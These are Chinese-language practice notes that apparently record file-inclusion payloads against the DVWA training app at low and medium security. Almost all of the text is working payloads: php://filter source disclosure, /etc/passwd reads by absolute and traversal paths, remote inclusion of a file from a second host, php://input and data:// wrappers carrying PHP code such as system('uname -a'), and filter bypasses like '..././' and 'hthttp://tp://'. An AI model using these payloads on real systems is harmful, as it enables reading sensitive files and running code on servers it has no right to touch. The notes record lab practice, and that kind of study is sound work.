# 情景1
原始连接:
http://192.168.122.4:8001/vulnerabilities/fi/?page=file1.php
## 本地包含
payload：
1、读取源码
http://192.168.122.4:8001/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=file1.php


2、通过绝对路径读取文件
http://192.168.122.4:8001/vulnerabilities/fi/?page=/etc/passwd


3、通过相对路径读取文件
http://192.168.122.4:8001/vulnerabilities/fi/?page=../../../../../etc/passwd


## 远程包含
payload:
1、http://192.168.122.4:8001/vulnerabilities/fi/?page=http://192.168.0.39:8001/r.txt


2、php://input
post数据:
```
<?php phpinfo(); ?>
```


3、data base64
```
data://text/plain;base64,PD9waHBpbmZvKCk7Lyo=
```
4、data://
```
data:;base64,PD9waHBpbmZvKCk7Lyo=
```
5、data
```
data:text/plain,<?php system(“uname -a”);?> 未成功，带定
```
来源：dvwa file inclusion low


# 情景2
过滤了
```
http://
https://
../
..\
```
payload:
```
/etc/passwd # 绝对路径
..././..././..././..././..././etc/passwd #相对路径
```
原理是将../过滤为空，所以通过经典的aaspsp类型绕过。
## 远程包含
1、http://192.168.122.4:8001/vulnerabilities/fi/?page=hthttp://tp://192.168.0.39:8001/r.txt
由于是过滤成空，经典漏洞，aaspsp类型绕过。
2、通过php://input
来源: dvwa file inclusion medium
